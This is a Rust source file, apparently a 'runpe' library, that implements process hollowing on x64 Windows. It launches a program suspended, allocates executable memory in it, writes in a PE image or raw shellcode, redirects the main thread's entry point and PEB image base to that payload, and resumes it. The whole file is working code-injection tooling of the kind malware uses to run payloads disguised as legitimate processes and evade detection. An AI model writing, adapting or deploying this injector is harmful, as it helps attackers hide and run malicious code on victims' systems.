use winapi::{
    shared::{
        basetsd::{DWORD64, SIZE_T},
        minwindef::{DWORD, LPVOID},
        ntdef::HANDLE,
    },
    um::{
        errhandlingapi::GetLastError,
        memoryapi::{VirtualAllocEx, WriteProcessMemory},
        processthreadsapi::{
            CreateProcessA, GetThreadContext, ResumeThread, SetThreadContext, TerminateProcess,
            PROCESS_INFORMATION, STARTUPINFOA,
        },
        winbase::CREATE_SUSPENDED,
        winnt::{CONTEXT, CONTEXT_FULL, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
    },
};

mod pe;

macro_rules! return_last_os_error {
    () => {
        return Err(RunpeError::Os(GetLastError() as u32))
    };
}

macro_rules! bool_checked {
    ($($tokens:tt)*) => {
        if $($tokens)* == 0 {
            return_last_os_error!();
        }
    };
}

#[derive(Debug)]
pub enum RunpeError {
    InvalidPe,
    Os(u32),
}

impl core::fmt::Display for RunpeError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            RunpeError::InvalidPe => f.write_str("invalid pe"),
            RunpeError::Os(code) => f.write_fmt(format_args!("code: {}", code)),
        }
    }
}

const PEB64_IMAGE_BASE_OFFSET: usize = 0x10;

#[repr(C)]
#[allow(dead_code)]
struct CustomArgument {
    entry_point: u64,
    entry_point_argument: u64,
    argument: u64,
    argument_length: u64,
}

pub enum Payload<'a> {
    Shellcode(&'a [u8]),
    Pe(&'a [u8]),
}

impl<'a> Payload<'a> {
    unsafe fn parse(&self) -> Result<ParsedPayload<'a>, RunpeError> {
        Ok(match self {
            Payload::Shellcode(sh) => ParsedPayload::Shellcode(sh),
            Payload::Pe(pe) => {
                ParsedPayload::Pe(pe::basic_parse_pe(pe).map_err(|_| RunpeError::InvalidPe)?)
            }
        })
    }
}

macro_rules! writeproc {
    ($process:ident, $image_base:ident, $offset:expr, $data:expr, $size:expr) => {
        bool_checked!(WriteProcessMemory(
            $process,
            $image_base.add($offset as usize) as LPVOID,
            $data as *const _ as LPVOID,
            $size as SIZE_T,
            core::ptr::null_mut(),
        ))
    };
}

enum ParsedPayload<'a> {
    Shellcode(&'a [u8]),
    Pe(pe::ParsedPe<'a>),
}

impl<'a> ParsedPayload<'a> {
    fn image_size(&self, buffer_size: usize) -> usize {
        match self {
            ParsedPayload::Shellcode(sh) => {
                let shellcode_len = sh.len();
                let aligned_for_argument =
                    align_up(shellcode_len, core::mem::align_of::<CustomArgument>());
                align_page_size(
                    aligned_for_argument + core::mem::size_of::<CustomArgument>() + buffer_size,
                )
            }
            ParsedPayload::Pe(pe) => pe.nt.OptionalHeader.SizeOfImage as usize,
        }
    }

    fn should_overwrite_image_base_in_peb(&self) -> bool {
        match self {
            ParsedPayload::Shellcode(_) => false,
            ParsedPayload::Pe(_) => true,
        }
    }

    fn custom_argument_offset(&self) -> Option<usize> {
        match self {
            ParsedPayload::Shellcode(sh) => {
                Some(align_up(sh.len(), core::mem::align_of::<CustomArgument>()))
            }
            ParsedPayload::Pe(_) => None,
        }
    }

    fn entry_point_rva(&self) -> usize {
        match self {
            ParsedPayload::Shellcode(_) => 0,
            ParsedPayload::Pe(pe) => pe.nt.OptionalHeader.AddressOfEntryPoint as usize,
        }
    }

    unsafe fn map_payload(&self, process: HANDLE, image_base: *const u8) -> Result<(), RunpeError> {
        match self {
            ParsedPayload::Shellcode(sh) => {
                writeproc!(process, image_base, 0, sh.as_ptr(), sh.len());
            }
            ParsedPayload::Pe(pe) => {
                writeproc!(
                    process,
                    image_base,
                    0,
                    pe.dos,
                    pe.nt.OptionalHeader.SizeOfHeaders
                );

                for &section in pe.sections.iter() {
                    writeproc!(
                        process,
                        image_base,
                        section.VirtualAddress,
                        pe.offset::<u8>(section.PointerToRawData as usize),
                        section.SizeOfRawData
                    );
                }
            }
        }

        Ok(())
    }
}

fn align_page_size(size: usize) -> usize {
    const PAGE_SIZE: usize = 0x1000;
    align_up(size, PAGE_SIZE)
}

fn align_up(n: usize, alignment: usize) -> usize {
    (n + alignment - 1) & !(alignment - 1)
}

// CONTEXT struct is not aligned by 16
#[repr(align(16))]
struct ContextWrapper(CONTEXT);

pub enum Argument<'a> {
    None,
    U64(u64),
    Bytes(&'a [u8]),
}

impl<'a> Argument<'a> {
    pub fn buffer_size(&self) -> Option<usize> {
        match self {
            Argument::None => None,
            Argument::U64(_) => None,
            Argument::Bytes(b) => Some(b.len()),
        }
    }
}

pub unsafe fn runpe_existing(
    process: HANDLE,
    thread: HANDLE,
    payload: Payload,
    argument: Argument<'_>,
) -> Result<(), RunpeError> {
    // Get thread context.
    let mut ctx: ContextWrapper = core::mem::zeroed();
    ctx.0.ContextFlags = CONTEXT_FULL;
    bool_checked!(GetThreadContext(thread, &mut ctx.0));

    // The main thread of the created process is started at the RtlUserThreadStart procedure.
    // RtlUserThreadStart has two arguments:
    // - thread_entry (rcx): the entry point of the process
    // - argument (rdx): thread argument. Set to PEB pointer for the main thread.

    // Get original entry point.
    let original_entry_point = ctx.0.Rcx as usize;
    let entry_point_argument = ctx.0.Rdx as usize;
    let peb = entry_point_argument as *const u8;

    let parsed_payload = payload.parse()?;

    // Allocate memory for the payload.
    let argument_buffer_size = argument.buffer_size().unwrap_or(0);
    let mem_size = parsed_payload.image_size(argument_buffer_size);
    let image_base = VirtualAllocEx(
        process,
        0 as _,
        mem_size as SIZE_T,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE,
    ) as *const u8;
    if image_base.is_null() {
        return_last_os_error!();
    }

    // Map the payload.
    parsed_payload.map_payload(process, image_base)?;

    // Overwrite the entry point.
    ctx.0.Rcx = image_base.add(parsed_payload.entry_point_rva()) as DWORD64;

    // Overwrite ImageBase in PEB.
    if parsed_payload.should_overwrite_image_base_in_peb() {
        // Only for x64.
        writeproc!(
            process,
            peb,
            PEB64_IMAGE_BASE_OFFSET,
            &image_base,
            core::mem::size_of::<u64>()
        );
    }

    // Write custom argument.
    if let Some(argument_offset) = parsed_payload.custom_argument_offset() {
        let (argument, argument_length) = match argument {
            Argument::None => (0, 0),
            Argument::U64(v) => (v, 0),
            Argument::Bytes(bytes) => {
                let buffer_offset = argument_offset + core::mem::size_of::<CustomArgument>();

                writeproc!(
                    process,
                    image_base,
                    buffer_offset,
                    bytes.as_ptr(),
                    bytes.len()
                );

                (image_base.add(buffer_offset) as u64, bytes.len())
            }
        };

        let argument = CustomArgument {
            entry_point: original_entry_point as u64,
            entry_point_argument: entry_point_argument as u64,
            argument,
            argument_length: argument_length as u64,
        };

        writeproc!(
            process,
            image_base,
            argument_offset,
            &argument,
            core::mem::size_of::<CustomArgument>()
        );

        // Overwrite the thread argument.
        ctx.0.Rdx = image_base.add(argument_offset as usize) as u64;
    }

    // Set the thread context.
    bool_checked!(SetThreadContext(thread, &ctx.0));

    Ok(())
}

// SAFETY: `executable` must be a valid pointer to a null-terminated char array.
pub unsafe fn create_suspended_process(
    executable: *const i8,
) -> Result<PROCESS_INFORMATION, RunpeError> {
    let mut startupinfo: STARTUPINFOA = unsafe { core::mem::zeroed() };
    startupinfo.cb = core::mem::size_of_val(&startupinfo) as DWORD;
    let mut processinfo: PROCESS_INFORMATION = unsafe { core::mem::zeroed() };

    unsafe {
        bool_checked!(CreateProcessA(
            executable,
            0 as _,
            0 as _,
            0 as _,
            1,
            CREATE_SUSPENDED,
            0 as _,
            0 as _,
            &mut startupinfo,
            &mut processinfo,
        ));
    }

    Ok(processinfo)
}

pub unsafe fn runpe(
    executable: *const i8,
    payload: Payload,
    resume: bool,
    argument: Argument<'_>,
) -> Result<PROCESS_INFORMATION, RunpeError> {
    let processinfo = create_suspended_process(executable)?;

    match runpe_existing(processinfo.hProcess, processinfo.hThread, payload, argument) {
        Ok(_) => {
            if resume {
                ResumeThread(processinfo.hThread);
            }

            Ok(processinfo)
        }
        Err(err) => {
            TerminateProcess(processinfo.hProcess, 0);
            Err(err)
        }
    }
}
